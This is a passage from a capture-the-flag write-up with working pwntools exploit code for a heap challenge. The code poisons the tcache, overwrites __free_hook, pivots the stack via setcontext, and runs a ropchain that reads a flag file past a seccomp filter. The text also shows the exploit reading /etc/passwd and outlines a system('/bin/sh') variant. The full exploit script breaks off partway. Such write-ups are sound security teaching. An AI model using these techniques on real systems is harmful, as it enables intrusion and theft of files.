</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x012345679abcdef</span><span class="p">))</span>  <span class="c1"># Overwrite the pointer</span>
</span></span></code></pre></div><p>Looking at the <code>tcache</code> we can see we corrupted our list :</p>
<pre tabindex="0"><code>gef➤  heap bins
...
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x564c2d1037a0, size=0x70, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x123456789abcdef]
</code></pre><p>Allocating a new dream of the same size, we are left with our corrupted chunk, allocating once more, we get a segmentation fault !</p>
<p>So we can write anywhere, but where do we want to write ? The goal is to control <code>rip</code>. The <code>got</code> is read-only, and we don&rsquo;t know its address. There isn&rsquo;t any pointer to function in the heap, so we are left with the libc.</p>
<p>Great targets are hooks ! Hooks, such as <code>__malloc_hook</code> or <code>__free_hook</code>, are pointers to functions to call when the corresponding function in their name is called.
Since we can trigger both of these functions, they seem like good targets.</p>
<p>Let&rsquo;s modify our script to overwrite <code>__free_hook</code> (I&rsquo;ll come back to why <code>__free_hook</code> rather than <code>malloc_hook</code> just after) :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a_random_string&#39;</span><span class="p">)</span>      <span class="c1"># take out &#34;eeee&#34; out of the tcache</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0123456789abcdef</span><span class="p">))</span> <span class="c1"># overwrite __free_hook</span>
</span></span></code></pre></div><p>Now, calling free triggers a segfault, with <code>rip</code> equals to <code>0x0123456789abcdef</code> ! We can control <code>rip</code>.</p>
<h2 id="stack-pivoting">Stack pivoting</h2>
<p>Now we can control the execution, but where do we want to go ? Remember that there is a seccomp whitelist ! Without it, we could try to call a <a href="https://github.com/david942j/one_gadget">one gadget</a> and get a shell, but here <code>execve</code> and others are not allowed.</p>
<p>The only interesting thing that the whitelisted syscalls let us do, are <code>open,</code> <code>read</code> and <code>write</code> on the flag file.
For this to work, we need to be able to execute at least a ropchain, at best a shellcode, so let&rsquo;s start with a ropchain.</p>
<p>But we don&rsquo;t control the values on the stack ! So, in order to ROP, we will need to do what is called a stack pivot, which is a (long) gadget which will let us control the <code>rsp</code> register, which we will set to a known location where we will previously have written a ropchain. This ropchain will be written on the heap, this is why we needed to leak the base address of the heap in the first place.</p>
<p>But how do we set the <code>rsp</code> value if we don&rsquo;t control the stack ? There is no gadget which will change <code>rsp</code> to a heap address on its own. This is the reason why I chose <code>__free_hook</code> over <code>__malloc_hook</code> : the only argument given to a call to <code>malloc</code> is a size, and as the function pointed by <code>__malloc_hook</code> is called before the actual chunk allocation, we end up with a size in the <code>rdi</code> register, which is not very interesting for us.
However, the argument to <code>free</code> is a pointer to the chunk we are trying to free, so if we overwrite <code>__free_hook</code> with our gadget, when our gadget is called, we control the values at <code>[rdi + 0x??]</code>. This is enough to do a stack pivot.</p>
<p>If there was no seccomp, using this same method, we could overwrite <code>__free_hook</code> with the address of <code>system</code>, create a <code>dream</code> with the content <code>/bin/sh\x00</code>, and free it to get a shell.</p>
<p>Where do we find this gadget ? In the libc ! (We don&rsquo;t even know the base address of the binary). There are <em>many</em> gadgets in a libc, so finding exactly what we want can take some time. There is a well-known gadget in the <code>setcontext</code> function in this version of the libc.</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">0x000521b5      488ba7a00000.  mov rsp, qword [rdi + 0xa0]
0x000521bc      488b9f800000.  mov rbx, qword [rdi + 0x80]
0x000521c3      488b6f78       mov rbp, qword [rdi + 0x78]
0x000521c7      4c8b6748       mov r12, qword [rdi + 0x48]
0x000521cb      4c8b6f50       mov r13, qword [rdi + 0x50]
0x000521cf      4c8b7758       mov r14, qword [rdi + 0x58]
0x000521d3      4c8b7f60       mov r15, qword [rdi + 0x60]
0x000521d7      488b8fa80000.  mov rcx, qword [rdi + 0xa8]
0x000521de      51             push rcx
0x000521df      488b7770       mov rsi, qword [rdi + 0x70]
0x000521e3      488b97880000.  mov rdx, qword [rdi + 0x88]
0x000521ea      488b8f980000.  mov rcx, qword [rdi + 0x98]
0x000521f1      4c8b4728       mov r8, qword [rdi + 0x28]
0x000521f5      4c8b4f30       mov r9, qword [rdi + 0x30]
0x000521f9      488b7f68       mov rdi, qword [rdi + 0x68]
0x000521fd      31c0           xor eax, eax
0x000521ff      c3             ret
</code></pre><p>We can control the value of many registers, including <code>rsp</code>, we just have to remember to put in <code>rcx</code> the address of the next gadget to start the ropchain - because it will be push on the stack, this is the value that the <code>ret</code> instruction will pop and execute.</p>
<p>Let&rsquo;s update our script and start the ropchain (and change the random string to the path to the flag, we will use this later) :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>                          <span class="c1"># The address of the setcontext gadget</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/home/user/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>                 <span class="c1"># Since we will need this string later to open the file, put it somewhere in the heap right now</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>                                <span class="c1"># overwrite __free_hook with the address of the setcontext gadget</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>              <span class="c1"># We could set the other register to useful values, but we have a lot of space so this is fine</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                                             <span class="c1"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
</span></span></code></pre></div><p>Notice that there is some padding before the <code>rsp_value</code>, this is be cause the value will be taken from <code>rdi + 0xa0</code>.
What value do we put for <code>rsp</code> and <code>rcx</code> ? Because <code>rcx</code> will be pushed to the new stack, we need to be precise to not overwrite important part of the ropchain.
First, the easy part : for <code>rcx_value</code>, we will put the address of a <code>ret</code> instruction, this way we can follow with a normal ropchain, ignoring this gadget.</p>
<p>For <code>rsp_value</code>, I will set it to be right after <code>rcx_value</code>, this way, when the <code>push rcx</code> happens, it pushes the address of the <code>ret</code> over &hellip; <code>rcx_value</code>, then when the <code>ret</code> of <code>setcontext</code> executes, it will pop the value that was just pushed into <code>rip</code>, executes the <code>ret</code>, and we can follow with a normal ropchain.
We can do this because we leaked the heap earlier.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521ff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/home/user/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rsp_value</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfd0</span>                         <span class="c1"># Calculated using a debugger</span>
</span></span><span class="line"><span class="cl"><span class="n">rcx_value</span> <span class="o">=</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                                             <span class="c1"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
</span></span></code></pre></div><p>Next, we can use <code>mprotect</code> (which is allowed by seccomp) to turn the heap executable, or simply continue with a ropchain, which I&rsquo;ll do here.
We have to <code>open</code> the file, <code>read</code> from the corresponding file descriptor, and <code>write</code> it to stdout. For both <code>read</code> and <code>write</code>, we can use the wrappers inside of libc, however, we cannot use the open for open, which uses the <code>shmctl</code> syscall, which is not permitted by seccomp. So for open, we will make the syscall directly.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521b5</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x521ff</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x43ae8</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x23eea</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x215bf</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1b96</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xd2745</span>
</span></span><span class="line"><span class="cl"><span class="n">read</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;eeee&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/home/user/flag.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rsp_value</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xfd0</span>                         <span class="c1"># Calculated using a debugger</span>
</span></span><span class="line"><span class="cl"><span class="n">rcx_value</span> <span class="o">=</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="n">ropchain</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsp_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>                                <span class="c1"># sets rax to the target syscall number</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                      <span class="c1"># SYS_OPEN</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># pointer to path</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x7a0</span><span class="p">)</span>                      <span class="c1"># address of string /home/user/flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># sets the fd value</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                      <span class="c1"># fd of the recently opened file</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>                                <span class="c1"># sets the where the content will be written</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>                              <span class="c1"># any writeable address</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>                                <span class="c1"># sets the number of bytes to read</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>                                <span class="c1"># address of the data read</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>                                               <span class="c1"># triggers __free_hook with a pointer to our chunk with the ropchain in rdi</span>
</span></span></code></pre></div><p>This works ! At the time of writing, the server is not up anymore, however running it locally and changing the flag path to <code>/etc/passwd</code> gives the expected output :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 test.py
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> heap base : 0x559520a93000
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> libc base : 0x7f0645cf0000
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
</span></span><span class="line"><span class="cl">root:x:0:0::/root:/bin/bash
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>When running it remotely, I just had to change the fd of the open file to be 5 instead of 3, probably because the program had additionnal open file descriptors due to the remote connection.</p>
<p>This was a nice challenge :)</p>
<h2 id="full-exploit">Full exploit</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;split-w&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./inception_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p = remote(&#34;remote1.thcon.party&#34;, 10904)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;-= Dream&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;azer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>
</span></span><span class="line"><span class="cl">
